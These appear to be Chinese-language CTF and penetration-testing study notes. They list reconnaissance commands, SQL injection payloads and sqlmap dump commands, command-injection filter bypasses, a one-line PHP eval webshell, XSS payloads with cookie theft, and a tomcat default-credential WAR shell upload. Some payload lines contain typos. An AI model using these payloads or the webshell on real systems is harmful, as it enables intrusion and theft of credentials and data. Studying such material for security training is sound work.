### Chorme开发人员工具
* 右键`检查`或`Crtl + Shift + I`打开开发人员工具
* Hackbar插件集成了常用的web请求、攻击手段


### SSH协议
* ssh（Secure Shell） 22端口
#### 基于口令认证
* 通过账号和口令登录到远程主机
* 弱口令暴力破解获取用户名和密码，不一定获取root权限
#### 基于密钥的安全认证
* `id_rsa` 私钥
* `id_rsa.pub` 公钥
* `chmod 600 id_rsa`
* `ssh -i id_rsa 用户名@主机地址` 登陆服务器
#### 信息探测
* `nmap -sV ip` 挖掘开放服务信息
* `nmap -A -v ip` 探测靶场全部信息
* `nmap -O ip` 探测靶场操作系统类型与版本

#### 分析探测结果，挖掘敏感信息
* ssh22端口考虑暴力破解和私钥泄露
* http服务80端口考虑浏览器访问和探测工具
* `dirb http://ip:port/` 对服务隐藏文件探测
* `nikto -host ip` 挖掘敏感信息

#### 登录主机
* `ssh -i id_rsa name@ip` 以name身份登录ip主机
* `find / -perm -4000 2>/dev/null` 查找具有root权限的文件

#### 权限提升
* `whoami`查看用户
* `id`查看权限
* `msfconsole`集成的攻击框架
* `/etc/crontab` 定时执行的文件
* `nc ip port` 监听端口
* `python -c "import pty;pty.spawn('/bin/bash')"` 优化shell

### SMB泄露
* SMB 139 445端口
* `smbclient -L ip` 

### FTP后门
* msf查看版本号获取漏洞代码

### SQL注入
#### sql基础
* RDBMS关系型数据库管理系统 库-表-列-行
#### 有回显
* `SELECT first_name, last_name FROM users WHERE user_id = '` +`1' or '1234' = '1234` + `'` 有趣的事情发生了，这条注入后的查询语句可以查询所有id的用户
* `...` + `1' or 1=1 order by 3 #` + `'`猜解sql查询语句中的字段数,巧妙地使注入符合语法，以字段3排序，若失败则只有3-1=2列
* `1' union select 1,2 #` 联合查询
* `1' union select 1,database() #` 查询数据库名 
* `1' union selcet 1, group_concat(table_name) from information_schema.tables where table_schema=database() #` 查询当前数据库的表名
* `1'and 1=2 union selcet 1,group_concat(column_name) from information_schema.columns where table_name='users' #` 获取表中字段名，1=2使第一个查询失效，或者使用limit
* `1'and 1=2 union selcet group_concat(user_id, first_name, last_name),group_concat(password) from users #` 查询数据

* 报错注入构造错误信息获取内容
  * xpath
  * extractvalue()
#### sqlmap
* `sqlmap -h` 帮助文档
* `sqlmap -u http://xxx.com/1.php?id＝11 --dbs` 查看数据库名
* `sqlmap -u http://xxx.com/1.php?id＝11 --current-db` 当前数据库信息
* `sqlmap -u http://xxx.com/1.php?id＝11 -D a --tables` 当前数据库信息，'a' 为指定数据库名称
* `sqlmap -u http://xxx.com/1.php?id＝11 -D a -T admin --columns` 列出指定表名的所有列名，'admin' 为指定表名称
* `sqlmap -u http://xxx.com/1.php?id＝11 -D a -T admin -C name,password --dump` 输出表名指定列名字段的值数据，'name，password' 为指定字段名称

#### 无回显
* 布尔盲注-回显不同
* 时间盲注-响应时间不同
* 报错盲注
 
### PHP代码审计
#### 弱类型
* `===`比较时会判断类型是否相同再比较
* `==`比较时会将字符串类型转化为相同再比较
* 由此可以演化出一系列弱类型攻击方法
#### 哈希绕过（MD5）
* 数组 array->null可以实现强相等
* "0exxxxx" == "0eyyyy" //true
* MD5哈希碰撞可以实现字符串强相等
#### 命令注入
* 执行系统命令时注入恶意拼接的代码，一般来说web服务器的用户执行权限是www-data
* r = 4; w = 2; x = 1;
  * -rwxr--r--等价于一个文件权限是744
  * drwxr--r--等价于一个目录权限是744
#### 常用shell命令
* `echo 'abc' | md5sum` 管道
* `%0a` `%0d` 换行符
* `;` 无论如何都执行
* `&&` 成功后执行
* `||` 失败后执行
#### Bypass
* 过滤空格的绕过
* `$IFS` `${IFS}` `$IFS$9` `<` `<>` `{cat,flag.php}` `%20` `%09`
* 过滤关键字的绕过
  * 反斜线`\`绕过
  * 两个单引号`''`绕过
  * base64 hex绕过
  * 通配符匹配 
  * 变量绕过
* 双写绕过（添加自身）
#### 代码执行
* `<? php eval($_POST[0]);?>` 一句话木马，因为evel把字符串当代码执行
* 异或绕过
* 取反绕过
* 正则表达式 ?><?=`/???/???%20*` 可以匹配上 echo `/bin/cat/flag.php`
* `$f=create_function('$a, $b, $code');`
#### HTTP参数传递
* GET方法传递
* POST方法传递
#### robots.txt君子协定
* 口头禁止爬虫爬取robot.txt下的内容
#### 反序列化
* 序列化serialize()将变量转化为字符串
* 反序列化unserialize()

#### 文件包含
* 本地文件包含 相对于服务器的本地文件
* 远程文件包含 相对于服务器的远程文件
##### php伪协议
* `file://`
##### 00截断

##### 长度截断


### XSS跨站脚本攻击
* Cross-site Scripting (XSS)，攻击者注入恶意脚本代码payload，用户访问网页时自动加载
#### 反射型XSS
* 见框插入JS代码`<script>alert("Hello")</script>`
* 大小写绕过
* 双写绕过
* 其它标签绕过img
#### 存储型XSS
* 多见于评论区注入，因其存储在服务器数据库中，导致持久存在
* htmlspecialchars()过滤

#### DOM型XSS
* JS操作document，重构DOM树

#### 操作
* XSS探针测试过滤的字符
* 查看源代码如何闭合标签和属性
* 构建XSS payload绕过检测

#### cookie窃取
* xss接收平台

### CSRF跨站请求伪造
* CSRF，全名 Cross Site Request Forgery，跨站请求伪造

### SSRF服务端请求伪造
* SSRF，Server-Side Request Forgery，服务端请求伪造

### 文件泄露
#### git泄露
* `./scrabble <url>` 探测源代码中的git泄露
#### vim泄露


### 常用框架

#### flask

#### Nginx

#### Apache

#### tomcat弱口令
* tomcat - tomcat 
* shell.jsp
* shell.jsp压缩为shell.zip再改名为shell.war
* 上传shell.war获取shell



### Web夺权模板
#### 信息探测
* `nmap -sV ip` 挖掘开放服务信息
* `nmap -A -v -T4 ip` 探测靶场全部信息
* `nmap -O ip` 探测靶场操作系统类型与版本
* `nikto -host ip:port` 挖掘敏感信息
* `dirb http://ip:port/` 对服务隐藏文件探测


#### 漏洞扫描
* web漏洞扫描器 owasp-zap

#### nc端口监听
* `nc ip port` 监听端口

#### 浏览器
* 浏览器查看敏感页面源代码